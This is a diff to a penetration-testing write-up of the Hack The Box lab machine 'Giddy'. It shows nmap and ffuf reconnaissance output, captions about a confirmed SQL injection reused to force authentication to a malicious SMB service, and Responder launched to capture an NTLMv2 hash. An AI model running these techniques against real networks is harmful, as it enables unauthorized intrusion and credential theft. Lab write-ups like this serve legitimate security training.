@@ -2,7 +2,7 @@
 
 ### Foothold
 
-{% code title="Nmap Results" overflow="wrap" %}
+{% code title="Nmap Results" %}
 ```
 ┌──[Sat Nov  5 08:42:55 PM CDT 2022]-[wlan0:192.168.1.153 tun0:10.10.16.2]-[TheScriptKid]-[/home/pentester/Downloads]
 └──# rscan $ip       
@@ -48,6 +48,7 @@ PORT     STATE SERVICE       REASON          VERSION
 | tls-alpn: 
 |   h2
 |_  http/1.1
+3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
 | rdp-ntlm-info: 
 |   Target_Name: GIDDY
 |   NetBIOS_Domain_Name: GIDDY
@@ -83,7 +84,9 @@ PORT     STATE SERVICE       REASON          VERSION
 | MtH9KyrGut5ZznkoGJndm6qtDKjz4fSH92YKnMzoy1U2e6kpe1O318qOd0cByUNA
 | LsQ=
 |_-----END CERTIFICATE-----
-|_ssl-date: 2022-11-06T01:45:59+00:00; 0s from scanner time....3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
+|_ssl-date: 2022-11-06T01:45:59+00:00; 0s from scanner time.
+5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
 |_http-server-header: Microsoft-HTTPAPI/2.0
 
 ```
@@ -91,7 +94,7 @@ PORT     STATE SERVICE       REASON          VERSION
 
 <figure><img src=".gitbook/assets/image (6).png" alt=""><figcaption><p>Landing Page. Nothing of Interest.</p></figcaption></figure>
 
-<pre data-overflow="wrap"><code>┌──[Sat Nov  5 08:53:37 PM CDT 2022]-[wlan0:192.168.1.153 tun0:10.10.16.2]-[TheScriptKid]-[/home/pentester/Downloads]
+<pre data-title="Web Directory Bruteforcing"><code>┌──[Sat Nov  5 08:53:37 PM CDT 2022]-[wlan0:192.168.1.153 tun0:10.10.16.2]-[TheScriptKid]-[/home/pentester/Downloads]
 └──# ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -u http://$ip/FUZZ/ -fc 404
 
         /'___\  /'___\           /'___\       
@@ -126,4 +129,78 @@ mvc                     [Status: 200, Size: 9902, Words: 754, Lines: 152, Durati
 
 <figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption><p>Confirmed SQL Injection</p></figcaption></figure>
 
-<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption><p>Redoing The Injection Using Burp Suite Using A Different Payload To Capture an NTLMv2 Hash </p></figcaption></figure>
+<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption><p>Redoing The Injection Using Burp Suite Using A Different Payload To Authenticate To A Malicious SMB Service </p></figcaption></figure>
+
+{% code title="Setting Up Responder To Capture NTLMv2 Hash" %}
+```
+┌──[Sat Nov  5 09:38:21 PM CDT 2022]-[wlan0:192.168.1.153 tun0:10.10.16.2]-[TheScriptKid]-[/home/pentester/Documents/PenetrationTesting/hackthebox/giddy]
+└──# /opt/Responder-3.1.3.0/Responder.py -I tun0
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR & MDNS Responder 3.1.3.0
+
+  To support this project:
+  Patreon -> https://www.patreon.com/PythonResponder
+  Paypal  -> https://paypal.me/PythonResponder
+
+  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+  To kill this script hit CTRL-C
+
+
+[+] Poisoners:
+    LLMNR                      [ON]
+    NBT-NS                     [ON]
+    MDNS                       [ON]
+    DNS                        [ON]
+    DHCP                       [OFF]
+
+[+] Servers:
+    HTTP server                [ON]
+    HTTPS server               [ON]
+    WPAD proxy                 [OFF]
+    Auth proxy                 [OFF]
+    SMB server                 [ON]
+    Kerberos server            [ON]
+    SQL server                 [ON]
+    FTP server                 [ON]
+    IMAP server                [ON]
+    POP3 server                [ON]
+    SMTP server                [ON]
+    DNS server                 [ON]
+    LDAP server                [ON]
+    RDP server                 [ON]
+    DCE-RPC server             [ON]
+    WinRM server               [ON]
+
+[+] HTTP Options:
+    Always serving EXE         [OFF]
+    Serving EXE                [OFF]
+    Serving HTML               [OFF]
+    Upstream Proxy             [OFF]
+
+[+] Poisoning Options:
+    Analyze Mode               [OFF]
+    Force WPAD auth            [OFF]
+    Force Basic Auth           [OFF]
+    Force LM downgrade         [OFF]
+    Force ESS downgrade        [OFF]
+
+[+] Generic Options:
+    Responder NIC              [tun0]
+    Responder IP               [10.10.16.2]
+    Responder IPv6             [dead:beef:4::1000]
+    Challenge set              [random]
+    Don't Respond To Names     ['ISATAP']
+
+[+] Current Session Variables:
+    Responder Machine Name     [WIN-KCZKDUX3IOS]
+    Responder Domain Name      [JIPN.LOCAL]
+    Responder DCE-RPC Port     [47384]
+
+[+] Listening for events...
+```
+{% endcode %}
